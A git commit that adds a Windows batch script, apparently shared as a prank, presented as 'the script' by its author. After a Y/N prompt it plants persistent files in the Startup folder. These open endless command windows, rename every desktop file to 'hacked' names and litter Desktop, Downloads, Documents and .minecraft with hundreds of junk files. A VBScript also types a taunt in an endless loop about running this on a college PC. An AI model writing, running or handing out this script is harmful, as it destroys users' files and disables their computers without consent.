325b19c9e572794b614e188c5a95a841784406dd
benJ <91833185+127-00-1@users.noreply.github.com>
2022-03-09 20:29:23 +0000

    The script - not the band
    https://github.com/luxuwu the man the myth the legend

---
+++ Luxs pc chugjug.bat
@@ -0,0 +1,71 @@
+@echo off
+color a
+echo Created by Lux <3, improved slightly by NoWhere > ~>
+:choice
+set /P c=do you want to run this?[Y/N]?
+if /I "%c%" EQU "Y" goto :k1
+if /I "%c%" EQU "N" goto :k2
+goto :choice
+:k2
+echo stoping task
+timeout 4
+pause
+:k1
+color 36
+
+
+echo :dumcmdspamshitidfk >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
+echo color 40>>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
+echo start /max cmd.bat >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
+echo timeout 1 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
+echo goto dumcmdspamshitidfk >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
+echo @echo off >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+echo echo L >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+echo :x >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+echo color f4 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+echo color 4f >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+echo goto x >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd.bat
+
+set xc=0
+set xp=0
+echo cd %%userprofile%%\desktop >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo :xo >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo set /a xc=%%xc%%+1 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo rename *.* 1hacked_%%xc%%>>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo ^if ^%%xp^%%=^=350 go^to ex^it >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo goto xo >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo :exit >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo exit >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\rename.bat
+echo :xp >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo set /a xp=%%xp%%+1 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+color 43
+color 34
+echo echo ^>^>%%userprofile%%\desktop\hacked_%%xp%% >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo echo ^>^>%%userprofile%%\Downloads\hacked_%%xp%% >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo echo ^>^>%%userprofile%%\Documents\hacked_%%xp%% >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo echo ^>^>%%userprofile%%\appdata\local\.minecraft\hacked_%%xp%% >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo if %%xp%%==350 goto exit >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo goto xp >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo :exit >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+echo exit >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spam.bat
+cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup
+color 50
+
+echo set x=wscript.createobject ("wscript.shell") >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo wscript.sleep 100 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo DO >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{CAPSLOCK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sEnDKeys "{nuMLocK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo X.SEnDkeYS "Imagine running this on a college pc, could not be me :)" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{CAPSLOCK}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo x.sendkeys "{ENTER}" >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo loop >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\spammer.vbs
+echo :x >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cope2.bat
+
+
+
+cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup
+spammer.vbs
+cmd1.bat
+cope2.bat
+start notepad
